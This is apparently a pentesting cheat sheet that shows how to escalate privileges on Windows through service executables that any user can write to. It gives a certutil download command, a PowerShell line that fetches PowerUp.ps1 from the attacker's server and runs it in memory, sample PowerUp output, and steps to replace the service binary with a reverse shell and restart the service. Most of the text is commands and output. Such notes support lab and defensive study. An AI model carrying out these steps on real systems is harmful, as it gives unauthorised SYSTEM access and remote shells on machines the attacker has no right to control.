# Service Exploits - Insecure Service Executables

Windows Sysinternals can be found:
- https://docs.microsoft.com/en-us/sysinternals/downloads/
- https://live.sysinternals.com/ (better to download direclty)

		certutil -urlcache -f https://live.sysinternals.com/accesschk.exe accesschk.exe

Download PowerUp.ps1 and run in memory

 `powershell iex (New-Object Net.WebClient).DownloadString('http://<yourwebserver>/PowerUp.ps1');Invoke-AllChecks`

Look for `Check: Modifiable Service Files` like in the service below

```
ServiceName                     : filepermsvc
Path                            : "C:\Program Files\File Permissions Service\filepermservice.exe"
ModifiableFile                  : C:\Program Files\File Permissions Service\filepermservice.exe
ModifiableFilePermissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
ModifiableFileIdentityReference : Everyone
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'filepermsvc'
CanRestart                      : True
Name                            : filepermsvc
Check                           : Modifiable Service Files
```

The service binary is writable.

Replace it with a reverse shell

	copy reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe"

Restart the service

	net start <Service-Name>
	